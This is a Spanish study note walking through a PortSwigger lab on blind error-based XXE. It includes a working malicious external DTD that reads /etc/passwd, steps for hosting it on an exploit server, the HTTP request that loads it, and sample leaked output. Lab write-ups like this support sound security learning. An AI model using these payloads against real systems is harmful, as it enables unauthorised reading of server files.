---
aliases:
  - XXE ciego - error-based con DTD externo
  - blind xxe error based
  - xxe error message file read
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — XXE ciego: error-based con DTD externo

> Lab: [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

**Qué demuestra:** ciego, **sin** buen canal OOB para el contenido (o el archivo tiene saltos de línea que rompen la exfil HTTP), pero el parser **muestra errores verbosos**. Forzás que intente abrir una **ruta inexistente cuyo nombre contiene el archivo** → el **mensaje de error** filtra el contenido. Sirve para `/etc/passwd` (multilínea), donde la exfil HTTP falla.

## Vector completo (3 partes)

### 1. El DTD malicioso — qué debe contener
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- `%file` → lee `/etc/passwd`.
- `%eval` → declara `%error`, que apunta a `file:///nonexistent/<contenido>`.
- `%error` → el parser intenta abrir esa ruta inexistente → **falla y filtra el contenido en el error**.
- `&#x25;` = `%` escapado (igual que en la exfil).

### 2. Hospedar en el exploit server
File `/exploit.dtd`, Body = el DTD de arriba, **Store** → copiá `https://EXPLOIT.exploit-server.net/exploit.dtd`.

### 3. La request que carga el DTD
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
La **respuesta HTTP** (no el Collaborator) trae un error tipo:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
El contenido de `/etc/passwd` aparece embebido en el mensaje.

## Detalles que se pasan por alto
- **Acá el dato vuelve en la RESPUESTA**, no en el Collaborator (a diferencia de la [[vulnerabilities/006-xxe/examples/xxe-ciego-exfiltrar-con-dtd-externo|exfil OOB]]). No hace falta pollear nada.
- Es la salida ideal para archivos **multilínea** (`/etc/passwd`) que romperían la exfil por URL HTTP.
- Requiere que el parser **muestre errores verbosos**. Si los traga → volvé a exfil OOB (HTTP/FTP) o [[vulnerabilities/006-xxe/examples/xxe-ciego-reutilizar-dtd-local|DTD local]].
- Mismo escapado `&#x25;` y mismo hospedaje externo que la exfil.
